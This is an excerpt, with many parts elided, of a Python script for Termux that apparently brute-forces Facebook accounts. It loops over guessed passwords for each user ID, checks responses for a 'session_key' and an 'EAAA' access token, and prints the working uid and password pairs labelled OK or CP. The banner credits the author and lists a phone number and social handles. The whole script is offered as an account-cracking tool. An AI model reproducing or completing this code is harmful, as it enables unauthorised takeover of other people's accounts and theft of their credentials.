...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/morimdhali.com?tab=repositories"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/YOUR.REAL.PAPA.K.S.S.G.R.R")
...
\033[1;32m..:::::..::..:::::..::..::::..::....::........:::
\033[1;90m═══════════════════════════════════════════════════════════
\033[1;94m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : RAKIB KING
\033[1;95m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSUP  : +8801942371412
\033[1;93m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB      : @Termux-Rakib-RK
...
\033[1;90m═══════════════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Rakib] : %s/%s -> \033[0;92m [ Rakib-RK-OK:%s ]- \033[0;91m[Rakib-TM-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;91m[Rakib-CP] %s|%s\033[0;97m         "%(uid, pw))
